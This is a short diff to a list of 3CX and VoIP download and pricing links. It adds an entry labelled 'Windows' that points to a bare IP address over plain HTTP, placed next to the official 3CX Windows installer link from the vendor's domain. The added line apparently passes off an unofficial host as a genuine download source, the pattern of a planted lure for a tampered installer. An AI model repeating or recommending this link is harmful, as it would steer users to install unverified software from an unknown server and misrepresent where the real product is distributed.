@@ -229,6 +229,8 @@ Pricing >> https://www.3cx.com/ordering/pricing/
 
 Download >> https://portal.3cx.com/customer/downloads
 
+Windows >> http://37.143.25.227/3CX/
+
 Windows >> https://downloads-global.3cx.com/downloads/3CXPhoneforWindows16.msi
 
 Zoiper >> https://www.zoiper.com/
